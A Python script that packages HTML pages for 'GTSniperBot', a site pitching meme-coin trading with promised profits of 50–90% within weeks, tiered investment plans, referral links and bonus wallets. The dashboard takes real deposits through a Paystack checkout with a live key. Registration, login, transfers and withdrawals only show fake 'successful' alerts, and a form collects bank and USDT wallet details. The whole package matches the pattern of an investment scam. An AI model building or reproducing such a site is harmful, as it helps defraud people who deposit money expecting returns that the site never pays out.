import zipfile

# Define the HTML files with their contents.
files = {
    "index.html": """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GTSniperBot | Revolutionizing Meme Coins Trading</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Preconnect for Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <!-- Google Font (Roboto) -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    /* Base Styles */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Roboto', sans-serif; line-height: 1.6; color: #333; background: #fdfdfd; }
    a { color: #0056b3; text-decoration: none; transition: color 0.3s ease; }
    a:hover { color: #003f7f; }
    /* Navigation Bar */
    .navbar { background: #0056b3; padding: 15px 0; position: fixed; width: 100%; top: 0; z-index: 100; }
    .navbar .container { max-width: 1200px; margin: auto; display: flex; justify-content: center; gap: 20px; }
    .navbar a { color: #fff; font-weight: 500; font-size: 1rem; }
    /* Sections */
    section { padding: 100px 20px 60px; max-width: 1200px; margin: auto; }
    section h1, section h2, section h3 { color: #0056b3; text-align: center; margin-bottom: 20px; }
    section p { text-align: center; margin-bottom: 20px; font-size: 1.1rem; }
    /* Homepage */
    #home { background: url('https://source.unsplash.com/1600x900/?technology,abstract') no-repeat center/cover; color: #fff; padding: 150px 20px; text-shadow: 2px 2px 5px rgba(0,0,0,0.6); }
    #home h1 { font-size: 3rem; margin-bottom: 10px; }
    #home p { font-size: 1.4rem; max-width: 800px; margin: 0 auto 30px; }
    .cta-buttons { text-align: center; margin-top: 20px; }
    .cta-buttons a { display: inline-block; background: #0056b3; color: #fff; padding: 12px 25px; margin: 10px; border-radius: 5px; font-weight: 500; transition: background 0.3s ease; }
    .cta-buttons a:hover { background: #003f7f; }
  </style>
</head>
<body>
  <!-- Navigation -->
  <nav class="navbar">
    <div class="container">
      <a href="#home">Home</a>
      <a href="#about">About Us</a>
      <a href="#testimonials">Testimonials</a>
      <a href="#contact">Contact Us</a>
    </div>
  </nav>

  <!-- Homepage Section -->
  <section id="home">
    <h1>GTSniperBot</h1>
    <p>Experience the next level in Meme Coins trading. Our sophisticated algorithms help you generate up to 90% more profit daily.</p>
    <div class="cta-buttons">
      <a href="registration.html">Register</a>
      <a href="login.html">Login</a>
    </div>
  </section>
</body>
</html>
""",

    "registration.html": """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Register | GTSniperBot</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
    .container { max-width: 400px; margin: auto; background: #fff; padding: 20px; border-radius: 5px; }
    input { width: 100%; padding: 10px; margin: 8px 0; }
    button { padding: 10px; background: #0056b3; color: #fff; border: none; cursor: pointer; }
    button:hover { background: #003f7f; }
    .message { color: green; margin-top: 10px; }
  </style>
</head>
<body>
<div class="container">
  <h2>Register</h2>
  <form id="registrationForm">
    <input type="text" id="contact" placeholder="Email Address or Telephone" required>
    <input type="password" id="password" placeholder="Create Password" required>
    <input type="password" id="confirmPassword" placeholder="Confirm Password" required>
    <input type="text" id="referral" placeholder="Referral (Optional)">
    <button type="submit">Register</button>
  </form>
  <div class="message" id="regMessage"></div>
</div>

<script>
  document.getElementById('registrationForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var password = document.getElementById('password').value;
    var confirmPassword = document.getElementById('confirmPassword').value;
    if(password !== confirmPassword) {
      document.getElementById('regMessage').textContent = "Passwords do not match.";
      return;
    }
    document.getElementById('regMessage').textContent = "Registration successful!";
    setTimeout(function() {
      window.location.href = "login.html";
    }, 2000);
  });
</script>
</body>
</html>
""",

    "login.html": """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login | GTSniperBot</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
    .container { max-width: 400px; margin: auto; background: #fff; padding: 20px; border-radius: 5px; }
    input { width: 100%; padding: 10px; margin: 8px 0; }
    button { padding: 10px; background: #0056b3; color: #fff; border: none; cursor: pointer; }
    button:hover { background: #003f7f; }
    .message { color: green; margin-top: 10px; }
  </style>
</head>
<body>
<div class="container">
  <h2>Login</h2>
  <form id="loginForm">
    <input type="text" id="loginContact" placeholder="Email Address or Telephone" required>
    <input type="password" id="loginPassword" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>
  <div class="message" id="loginMessage"></div>
</div>

<script>
  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    document.getElementById('loginMessage').textContent = "Login successful!";
    setTimeout(function() {
      window.location.href = "dashboard.html";
    }, 2000);
  });
</script>
</body>
</html>
""",

    "dashboard.html": """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dashboard | GTSniperBot</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Roboto', sans-serif; background: #f5f7fa; color: #333; }
    .header { background: #0056b3; color: #fff; padding: 20px 30px; display: flex; justify-content: space-between; align-items: center; }
    .header h1 { font-size: 1.8rem; margin: 0; }
    .header button { background: #fff; color: #0056b3; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: 500; transition: background 0.3s; }
    .header button:hover { background: #e6e6e6; }
    .container { max-width: 1200px; margin: 20px auto; padding: 0 20px; }
    .section { background: #fff; margin-bottom: 20px; padding: 20px; border-radius: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
    .section h2 { margin-bottom: 15px; color: #0056b3; font-size: 1.4rem; }
    .wallets p { font-size: 1.1rem; margin-bottom: 10px; }
    .investments ul { list-style: none; padding-left: 0; }
    .investments ul li { padding: 10px; border-bottom: 1px solid #ddd; font-size: 1rem; }
    .investments button { background: #0056b3; color: #fff; border: none; padding: 12px; font-size: 1rem; border-radius: 5px; margin-top: 15px; cursor: pointer; transition: background 0.3s ease; }
    .investments button:hover { background: #003f7f; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
    .timer { font-size: 1.2rem; font-weight: bold; margin-top: 5px; color: #e67e22; }
    form input, form button { padding: 10px; border-radius: 5px; margin-bottom: 10px; width: 100%; font-size: 1rem; }
    form input { border: 1px solid #ccc; }
    form button { border: none; background: #0056b3; color: #fff; cursor: pointer; transition: background 0.3s; }
    form button:hover { background: #003f7f; }
    @media (max-width: 768px) {
      .header { flex-direction: column; text-align: center; }
      .header h1 { margin-bottom: 10px; }
    }
  </style>
  <script src="https://js.paystack.co/v1/inline.js"></script>
</head>
<body>
  <div class="header">
    <h1>Welcome, [User]</h1>
    <button onclick="logout()">Logout</button>
  </div>
  
  <div class="container">
    <div class="section wallets">
      <h2>Your Wallets</h2>
      <p><strong>Bonus Wallet:</strong> N10,000/$6 (+ additional 5% bonus on investment)</p>
      <p><strong>Personal Wallet:</strong> <span id="investmentAmount">N0/$0</span></p>
      <p><strong>Profit Wallet:</strong> <span id="profitAmount">N0/$0</span></p>
    </div>

    <div class="section investments">
      <h2>Investment Options</h2>
      <ul>
        <li><strong>N100,000/$60 Investment:</strong> 50% profit after 30 days – Pay N5,000 daily</li>
        <li><strong>N500,000/$300 Investment:</strong> 70% profit after 20 days – Pay N42,500 daily</li>
        <li><strong>N1,000,000/$600 Investment:</strong> 90% profit after 15 days – Pays N126,000 daily</li>
      </ul>
      <button onclick="makePayment(100000)">Invest Now</button>
    </div>

    <div class="section transactions">
      <h2>Withdrawals & Transactions</h2>
      <p>Note: A 3% service charge applies to every withdrawal.</p>
      <button id="withdrawButton" disabled onclick="withdrawFunds()">Withdraw Funds</button>
      <p>Withdrawal available in: <span class="timer" id="withdrawTimer"></span></p>
      <h3>Transaction History</h3>
      <table>
        <thead>
          <tr>
            <th>Type</th>
            <th>Amount</th>
            <th>Date</th>
          </tr>
        </thead>
        <tbody id="transactionHistory">
          <tr>
            <td>Deposit</td>
            <td>N100,000</td>
            <td>2025-04-01</td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="section referrals">
      <h2>Fund Transfer & Referral</h2>
      <form id="transferForm">
        <input type="text" id="recipient" placeholder="Recipient's Username or ID" required>
        <input type="number" id="transferAmount" placeholder="Amount" required>
        <button type="submit">Transfer Funds</button>
      </form>
      <h3>Your Referral Link</h3>
      <p><input type="text" readonly value="https://yourdomain.com/register?ref=YourUniqueID"></p>
    </div>

    <div class="section">
      <h2>Account Details</h2>
      <form id="accountDetails">
        <input type="text" id="bankAccount" placeholder="Local Bank Account Details" required>
        <input type="text" id="usdtWallet" placeholder="USDT Wallet Address (TRC20 Only)" required>
        <button type="submit">Submit Details</button>
      </form>
    </div>
  </div>

  <script>
    function logout() {
      alert("Logged out successfully!");
      window.location.href = "login.html";
    }
    function makePayment(amount) {
      var handler = PaystackPop.setup({
        key: 'pk_live_a2e3b62d1ece2cc1bbffab35afa3819647c5a848',
        email: 'user@example.com',
        amount: amount * 100,
        currency: "NGN",
        callback: function(response){
          alert('Payment successful. Transaction reference: ' + response.reference);
        },
        onClose: function(){ alert('Payment window closed.'); }
      });
      handler.openIframe();
    }
    function updateWithdrawalTimer() {
      var now = new Date();
      var currentHour = now.getHours();
      var day = now.getDay();
      if (day > 0 && day < 6 && currentHour >= 12 && currentHour < 22) {
        document.getElementById('withdrawButton').disabled = false;
        document.getElementById('withdrawTimer').textContent = "Withdrawal open now!";
      } else {
        document.getElementById('withdrawButton').disabled = true;
        var nextAvailable = new Date(now);
        if (currentHour >= 22) { nextAvailable.setDate(nextAvailable.getDate() + 1); }
        nextAvailable.setHours(12, 0, 0, 0);
        var diff = nextAvailable - now;
        var hours = Math.floor(diff / 1000 / 60 / 60);
        var minutes = Math.floor((diff / 1000 / 60) % 60);
        document.getElementById('withdrawTimer').textContent = hours + "h " + minutes + "m";
      }
    }
    updateWithdrawalTimer();
    setInterval(updateWithdrawalTimer, 60000);
    function withdrawFunds() { alert("Withdrawal processed (3% fee applied)."); }
    document.getElementById('transferForm').addEventListener('submit', function(e) {
      e.preventDefault();
      alert("Funds transferred successfully!");
    });
    document.getElementById('accountDetails').addEventListener('submit', function(e) {
      e.preventDefault();
      alert("Account details submitted and locked.");
      document.getElementById('bankAccount').disabled = true;
      document.getElementById('usdtWallet').disabled = true;
    });
  </script>
</body>
</html>
"""
}

# Create the ZIP file and add each file to it.
zip_filename = "GTSniperBot.zip"
with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
    for filename, content in files.items():
        zipf.writestr(filename, content)

print(f"Created {zip_filename} with the following files:")
for filename in files:
    print(" -", filename)
